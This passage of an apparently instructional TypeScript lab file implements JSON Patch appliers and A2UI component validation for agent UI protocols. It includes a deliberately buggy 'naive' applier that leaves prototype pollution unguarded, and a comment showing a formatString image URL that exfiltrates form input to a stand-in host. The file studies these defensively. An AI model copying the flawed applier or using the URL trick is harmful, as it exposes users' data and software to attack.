  if (tokens.length === 0) return { ok: true, doc: value, reason: '' }
  const g = getAt(doc, tokens)
  if (!g.ok) return fail(g.reason)
  const parent = getAt(doc, tokens.slice(0, -1)).value
  const last = tokens[tokens.length - 1]!
  if (Array.isArray(parent)) parent[parseArrayIndex(last)!] = value
  else (parent as Obj)[last] = value
  return { ok: true, doc, reason: '' }
}

export interface PatchResult {
  ok: boolean
  /** 成功：新文档；失败：**原来那个**文档，一个字节没动。 */
  doc: Json
  /** 失败时 `#第几个op 原因`。 */
  reason: string
}

/**
 * TODO 4 的参考实现。对深拷贝逐个应用，任何一个 op 失败整份 patch 失败、原文档原样返回。
 * 支持 add / remove / replace / move / copy / test。
 *   add      父节点必须存在；数组下标 0..len 或 '-'（追加）；对象键存在就覆盖
 *   remove / replace  目标必须存在
 *   move     from 必须存在；from 不能是 path 的真前缀（move-into-child）；from === path 是空操作
 *   copy     from 必须存在，值深拷贝
 *   test     jsonTypeEqual，不等 → test-failed
 *
 * ★ 逐条应用、遇错就停、保留已应用的部分：UI 渲染出一个协议里从未存在过的「一半旧一半新」（RFC 6902 §5）。
 * ★ 通过了 AG-UI 的 schema 校验 ≠ 能应用：「指针解不解得开」是 applier 的事，协议明说不管。
 */
export function applyPatchAtomic(doc: Json, ops: unknown): PatchResult {
  const failed = (i: number, reason: string): PatchResult => ({ ok: false, doc, reason: `#${i} ${reason}` })
  if (!Array.isArray(ops)) return { ok: false, doc, reason: 'not-an-array' }
  let work = cloneJson(doc)
  for (let i = 0; i < ops.length; i++) {
    const op = ops[i]
    if (!isObj(op) || typeof op.op !== 'string' || typeof op.path !== 'string') return failed(i, 'bad-op')
    const ptr = decodePointer(op.path)
    if (!ptr.ok) return failed(i, ptr.reason)
    let r: Step
    if (op.op === 'add' || op.op === 'replace' || op.op === 'test') {
      if (!hasOwn(op, 'value')) return failed(i, 'missing-value')
      const value = op.value!
      if (op.op === 'add') r = addAt(work, ptr.tokens, cloneJson(value))
      else if (op.op === 'replace') r = replaceAt(work, ptr.tokens, cloneJson(value))
      else {
        const g = getAt(work, ptr.tokens)
        r = !g.ok ? fail(g.reason) : jsonTypeEqual(g.value, value) ? { ok: true, doc: work, reason: '' } : fail('test-failed')
      }
    } else if (op.op === 'remove') r = removeAt(work, ptr.tokens)
    else if (op.op === 'move' || op.op === 'copy') {
      if (typeof op.from !== 'string') return failed(i, 'missing-from')
      const from = decodePointer(op.from)
      if (!from.ok) return failed(i, from.reason)
      const g = getAt(work, from.tokens)
      if (!g.ok) return failed(i, `from:${g.reason}`)
      if (op.op === 'move') {
        if (op.from === op.path) r = { ok: true, doc: work, reason: '' }
        else if (op.path.startsWith(op.from + '/')) r = fail('move-into-child')
        else {
          const rm = removeAt(work, from.tokens)
          r = rm.ok ? addAt(rm.doc, ptr.tokens, g.value) : rm
        }
      } else r = addAt(work, ptr.tokens, cloneJson(g.value))
    } else return failed(i, `unknown-op:${op.op}`)
    if (!r.ok) return failed(i, r.reason)
    work = r.doc
  }
  return { ok: true, doc: work, reason: '' }
}

/** 朴素下标：跳过前导空格、读前导数字（parseInt 的行为）。读不到 → null。 */
function looseIndex(t: string): number | null {
  let i = 0
  while (i < t.length && t[i] === ' ') i++
  let n = ''
  while (i < t.length && t[i]! >= '0' && t[i]! <= '9') n += t[i++]
  return n === '' ? null : Number(n)
}

/** 朴素相等：数字和布尔先转数字再比（JS 的 ==、Python 的 == 在这里一致），其余标量严格相等，对象一律不等。 */
function looseEq(a: Json, b: Json): boolean {
  const num = (x: Json) => (typeof x === 'boolean' ? (x ? 1 : 0) : (x as number))
  const ta = jsonType(a)
  const tb = jsonType(b)
  if ((ta === 'number' || ta === 'boolean') && (tb === 'number' || tb === 'boolean')) return num(a) === num(b)
  if (ta !== tb) return false
  if (ta === 'string' || ta === 'null') return a === b
  return false
}

/**
 * 对照组：一个「看起来对」的 applier。只支持 add / replace / remove / test。
 * ★ 五个错：遇错就停且保留已应用的部分、`~0` 先于 `~1`、下标用 parseInt、test 用 ==、不挡 __proto__。
 *   最后一条这里不真跑（真跑会改掉这个进程里的 Object.prototype），只报告它会写到哪。
 */
export function applyPatchNaive(doc: Json, ops: { op: string; path: string; value?: Json }[]): { doc: Json; reason: string } {
  const work = cloneJson(doc)
  for (let i = 0; i < ops.length; i++) {
    const op = ops[i]!
    const tokens = op.path
      .slice(1)
      .split('/')
      .map((t) => t.split('~0').join('~').split('~1').join('/'))
    if (tokens.some((t) => FORBIDDEN_SEGMENTS.includes(t))) return { doc: work, reason: `#${i} 会写到 Object.prototype.${tokens[tokens.length - 1]}（这里不真跑）` }
    let parent: Json = work
    for (const t of tokens.slice(0, -1)) {
      if (Array.isArray(parent)) {
        const k = looseIndex(t)
        parent = k !== null && k < parent.length ? parent[k]! : null
      } else if (isObj(parent)) parent = hasOwn(parent, t) ? parent[t]! : null
      else parent = null
      if (parent === null) return { doc: work, reason: `#${i} path-not-found` }
    }
    const last = tokens[tokens.length - 1]!
    if (Array.isArray(parent)) {
      const k = last === '-' ? parent.length : looseIndex(last)
      if (k === null) return { doc: work, reason: `#${i} bad-index` }
      if (op.op === 'add') parent.splice(k, 0, op.value!)
      else if (op.op === 'test') {
        if (k >= parent.length || !looseEq(parent[k]!, op.value!)) return { doc: work, reason: `#${i} test-failed` }
      } else {
        if (k >= parent.length) return { doc: work, reason: `#${i} path-not-found` }
        if (op.op === 'replace') parent[k] = op.value!
        else parent.splice(k, 1)
      }
    } else if (isObj(parent)) {
      if (op.op === 'add') parent[last] = op.value!
      else if (!hasOwn(parent, last)) return { doc: work, reason: `#${i} path-not-found` }
      else if (op.op === 'test') {
        if (!looseEq(parent[last]!, op.value!)) return { doc: work, reason: `#${i} test-failed` }
      } else if (op.op === 'replace') parent[last] = op.value!
      else delete parent[last]
    } else return { doc: work, reason: `#${i} path-not-found` }
  }
  return { doc: work, reason: '' }
}

/**
 * A2UI 的 updateDataModel：value 是 null → **删掉**这个键（v1.0 原文）。
 * ★ 同一个 null 在 JSON Patch 里是「设成 null」。A2UI 的标准传输就是 AG-UI——两条路径上同一个值意思相反。
 */
export function a2uiUpdateDataModel(doc: Json, path: string, value: Json): Json {
  const ptr = decodePointer(path)
  if (!ptr.ok) return doc
  const work = cloneJson(doc)
  const r = value === null ? removeAt(work, ptr.tokens) : addAt(work, ptr.tokens, value)
  return r.ok ? r.doc : doc
}

// ─────────────────────────────────────────────────────────────
// 八、A2UI：邻接表、目录、URL 属性（§5.3–5.5、§5.7）
// ─────────────────────────────────────────────────────────────

/** 目录里一个属性的类型（lab 的简化版目录）。 */
export type PropKind = 'text' | 'url' | 'child' | 'children' | 'binding' | 'action'

export interface CompDef {
  props: Record<string, PropKind>
  /** v1.0 候选：省略 = 任何父组件都行。 */
  allowedParents?: string[]
  allowedChildren?: string[]
}

export type Caller = 'rendererOnly' | 'agentOnly' | 'rendererOrAgent'

export interface A2uiCatalog {
  /** ★ 一个字符串 ID，不是可解析的 URI——长得像 URL 也不许去 fetch。 */
  catalogId: string
  components: Record<string, CompDef>
  functions: Record<string, { allowedCallers: Caller }>
  /** URL 型属性允许的主机（精确匹配）。 */
  urlHosts: string[]
}

export interface A2uiComponent {
  id: string
  component: string
  [prop: string]: unknown
}

export interface TreeError {
  code: string
  id: string
  detail: string
}

export interface TreeReport {
  /** 有 root 才开始渲染；没有 root 时其余组件只缓冲（规范原文），不算错误。 */
  hasRoot: boolean
  errors: TreeError[]
  /** 被引用但还没定义的 id：渲染占位符，不是错误（progressive rendering）。 */
  placeholders: string[]
  /** 从 root 深度优先走到的组件，按渲染顺序。 */
  rendered: string[]
  /** hasRoot 且没有错误。 */
  ok: boolean
}

/** ★ 规范对环、多父、深度只字未提（grep 零命中）：这个数字是 lab 声明的常量，不是引用规范。 */
export const MAX_TREE_DEPTH = 16

/** URL 型属性：必须是字面量 https URL，主机（精确）在目录白名单里。 */
export function urlHostAllowed(v: string, hosts: string[]): boolean {
  if (asciiLower(v.slice(0, 8)) !== 'https://') return false
  let rest = v.slice(8)
  let cut = rest.length
  for (const c of ['/', '?', '#']) {
    const k = rest.indexOf(c)
    if (k >= 0 && k < cut) cut = k
  }
  rest = rest.slice(0, cut)
  if (rest.includes('@')) return false
  return hosts.includes(asciiLower(rest))
}

function isBinding(v: unknown): boolean {
  return isObj(v) && typeof (v as Obj).path === 'string'
}

function isCall(v: unknown): boolean {
  return isObj(v) && typeof (v as Obj).call === 'string'
}

/** 目录查找只认自有属性。★ `catalog.functions['toString']` 会摸到 Object.prototype 上的函数，被当成「已注册」。 */
function own<T>(rec: Record<string, T>, k: string): T | undefined {
  return Object.hasOwn(rec, k) ? rec[k] : undefined
}

/** 组件的子引用，按目录里属性的声明顺序。 */
function childRefs(c: A2uiComponent, def: CompDef): string[] {
  const out: string[] = []
  for (const [k, kind] of Object.entries(def.props)) {
    const v = c[k]
    if (kind === 'child' && typeof v === 'string') out.push(v)
    if (kind === 'children' && Array.isArray(v)) for (const x of v) if (typeof x === 'string') out.push(x)
  }
  return out
}

/**
 * TODO 5 的参考实现：一次 updateComponents 的组件列表对照**本地**目录校验。
 *
 * 第一遍，逐个组件（列表顺序）：
 *   DUPLICATE_ID          同一个 id 出现第二次（后一个不再参与）
 *   UNKNOWN_COMPONENT     组件类型不在目录里
 *   UNKNOWN_PROP          属性不在这个组件的目录定义里（id、component 除外）
 *   URL_NOT_LITERAL       url 型属性不是字符串（DataBinding、formatString 都算）
 *   URL_HOST_NOT_ALLOWED  url 字面量不是 https，或主机不在 urlHosts
 *   BAD_PROP              text：字符串 / 绑定 / 函数调用之外的值；child：不是字符串；children：不是字符串数组；
 *                         binding：不是 {path}；action：不是 {call}
 *   UNKNOWN_FUNCTION      action 或 text 里的函数调用不在目录里
 * 没有 root：hasRoot=false，到此为止（缓冲，不渲染）。
 * 第二遍，从 root 深度优先（子引用按 childRefs 的顺序）：
 *   引用的 id 不存在          → placeholders（不是错误）
 *   引用的 id 在当前路径上    → CYCLE，detail 是 `root>a>b>a` 这样的路径
 *   引用的 id 已经有父节点    → MULTI_PARENT，detail `子: 先前的父 + 这一个父`
 *   深度超过 MAX_TREE_DEPTH  → TOO_DEEP（root 深度 0）
 *   allowedParents / allowedChildren 不允许 → UNALLOWED_PARENT，detail `子类型 under 父类型`
 *   目录外的组件不渲染、不展开
 *
 * ★ 邻接表不是嵌套 JSON：`a→b→a` 每个组件单独看都合法，朴素递归渲染器会栈溢出。
 * ★ 「不执行代码」≠「不外泄」：Image.url = formatString('https://x/?d=${/form}')，渲染即发请求，用户每敲一个字再发一次。
 */
export function validateTree(components: A2uiComponent[], catalog: A2uiCatalog): TreeReport {
  const errors: TreeError[] = []
  const err = (code: string, id: string, detail: string) => errors.push({ code, id, detail })
  const byId = new Map<string, A2uiComponent>()

  for (const c of components) {
    if (byId.has(c.id)) {
      err('DUPLICATE_ID', c.id, c.component)
      continue
    }
    byId.set(c.id, c)
    const def = own(catalog.components, c.component)
    if (def === undefined) {
      err('UNKNOWN_COMPONENT', c.id, c.component)
      continue
    }
    for (const k of Object.keys(c)) {
      if (k === 'id' || k === 'component') continue
      const kind = own(def.props, k)
      const v = c[k]
      if (kind === undefined) err('UNKNOWN_PROP', c.id, k)
      else if (kind === 'url') {
        if (typeof v !== 'string') err('URL_NOT_LITERAL', c.id, `${k}=${J(v)}`)
        else if (!urlHostAllowed(v, catalog.urlHosts)) err('URL_HOST_NOT_ALLOWED', c.id, `${k}=${v}`)
      } else if (kind === 'text') {
        if (isCall(v)) {
          const fn = (v as Obj).call as string
          if (own(catalog.functions, fn) === undefined) err('UNKNOWN_FUNCTION', c.id, `${k}:${fn}`)
        } else if (typeof v !== 'string' && !isBinding(v)) err('BAD_PROP', c.id, k)
      } else if (kind === 'child') {
        if (typeof v !== 'string') err('BAD_PROP', c.id, k)
      } else if (kind === 'children') {
        if (!Array.isArray(v) || v.some((x) => typeof x !== 'string')) err('BAD_PROP', c.id, k)
      } else if (kind === 'binding') {
        if (!isBinding(v)) err('BAD_PROP', c.id, k)
      } else if (!isCall(v)) err('BAD_PROP', c.id, k)
      else {
        const fn = (v as Obj).call as string
        if (own(catalog.functions, fn) === undefined) err('UNKNOWN_FUNCTION', c.id, `${k}:${fn}`)
      }
    }
  }

  const placeholders: string[] = []
  const rendered: string[] = []
  if (!byId.has('root')) return { hasRoot: false, errors, placeholders, rendered, ok: false }

  const parentOf = new Map<string, string>()
  const visit = (id: string, path: string[]): void => {
    const c = byId.get(id)!
    const def = own(catalog.components, c.component)
    if (def === undefined) return
    if (path.length > MAX_TREE_DEPTH) {
      err('TOO_DEEP', id, String(path.length))
      return
    }
    rendered.push(id)
    const here = [...path, id]
    for (const k of childRefs(c, def)) {
      if (here.includes(k)) {
        err('CYCLE', k, [...here, k].join('>'))
        continue
      }
      const prev = parentOf.get(k)
      if (prev !== undefined) {
        err('MULTI_PARENT', k, `${k}: ${prev} + ${id}`)
        continue
      }
      parentOf.set(k, id)
      const child = byId.get(k)
      if (child === undefined) {
        if (!placeholders.includes(k)) placeholders.push(k)
        continue
      }
      const cdef = own(catalog.components, child.component)
      if (cdef !== undefined) {
        const okParent = cdef.allowedParents === undefined || cdef.allowedParents.includes(c.component)
        const okChild = def.allowedChildren === undefined || def.allowedChildren.includes(child.component)
        if (!okParent || !okChild) {
          err('UNALLOWED_PARENT', k, `${child.component} under ${c.component}`)
          continue
        }
      }
      visit(k, here)
    }
  }
  visit('root', [])
  return { hasRoot: true, errors, placeholders, rendered, ok: errors.length === 0 }
}

/** catalogId 只在本地目录里按字符串找。★ 永远不 fetch：按 agent 给的 URL 拉目录，等于让 agent 决定你有哪些组件。 */
export function resolveCatalog(catalogId: string, local: A2uiCatalog[]): A2uiCatalog | null {
  for (const c of local) if (c.catalogId === catalogId) return c
  return null
}

/**
 * agent 想调一个渲染器函数（v1.0 候选的 callRendererFunction）。
 * ★ 和 MCP Apps 的 visibility 是同一个问题的镜像，默认方向相反：MCP Apps 省略 = 双方能调；A2UI 未注册 = 拒绝。
 */
export function agentMayCall(fn: string, catalog: A2uiCatalog): Decision {
  const f = own(catalog.functions, fn)
  if (f === undefined) return deny('INVALID_FUNCTION_CALL:unregistered')
  if (f.allowedCallers === 'rendererOnly') return deny('INVALID_FUNCTION_CALL:rendererOnly')
  return allow()
}

// ─────────────────────────────────────────────────────────────
// 九、从 iframe 通往模型上下文的两条路，和 AG-UI 的两处宽松（§2.5、§6.4、§8.1）
// ─────────────────────────────────────────────────────────────

export interface IngestedMessage {
  ok: boolean
  role: 'user'
  text: string
  /** ★ role 是 user，内容来自第三方代码。L14 的「按参数来源授权」在这里多了一个来源：app。 */
  source: 'app'
  server: string
  needsConfirm: boolean
  error: string
}

/**
 * View 发来的 ui/message（params: { role: "user", content: { type: "text", text } }）进对话之前。
 * 规范只说宿主 MAY 征询同意；这里一律打上 source:"app" 并要求确认。形状不对 → error。
 */
export function ingestUiMessage(params: unknown, server: string): IngestedMessage {
  const out = (text: string, error: string): IngestedMessage => ({ ok: error === '', role: 'user', text, source: 'app', server, needsConfirm: true, error })
  if (!isObj(params)) return out('', 'bad-shape')
  if (params.role !== 'user') return out('', `role:${J(params.role ?? null)}`)
  const c = params.content
  if (!isObj(c) || c.type !== 'text' || typeof c.text !== 'string') return out('', 'bad-shape')
  return out(c.text, '')
}

/**
 * ui/update-model-context：每次覆盖同一个 View 上一次的内容；下一轮只送最后一次。
 * 返回 [view, content]，按 View 第一次出现的顺序。
 */
export function modelContextForTurn(updates: { view: string; content: string }[]): [string, string][] {
  const order: string[] = []
  const last = new Map<string, string>()
  for (const u of updates) {
    if (!last.has(u.view)) order.push(u.view)
    last.set(u.view, u.content)
  }
  return order.map((v) => [v, last.get(v)!])
}

export type Outcome = 'success' | 'interrupt' | 'cancelled' | 'unknown'

/**
 * AG-UI 1.0 的 RUN_FINISHED.outcome。
 * ★ 协议说认不出的 outcome 剥掉、当成功读——以后新增一个 cancellation，所有 1.0 消费者都会读成「完成」。这里报 unknown。
 */
export function readOutcome(raw: unknown): Outcome {
  const t = isObj(raw) ? raw.type : raw
  if (t === 'success' || t === 'interrupt' || t === 'cancelled') return t
  return 'unknown'
}

const ISO_RE = /^[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}(\.[0-9]{1,3})?Z$/

/**
 * Interrupt.expiresAt。★ 协议原文：格式不对的值让中断「看起来永不过期」。这里反过来：格式不对 = 已过期（fail-closed）。
 * 只认 UTC 的 `YYYY-MM-DDTHH:MM:SS(.sss)Z`，比较前 19 个字符。
 */
export function interruptExpired(expiresAt: unknown, nowIso: string): boolean {
  if (typeof expiresAt !== 'string' || !ISO_RE.test(expiresAt)) return true
  return expiresAt.slice(0, 19) <= nowIso.slice(0, 19)
}
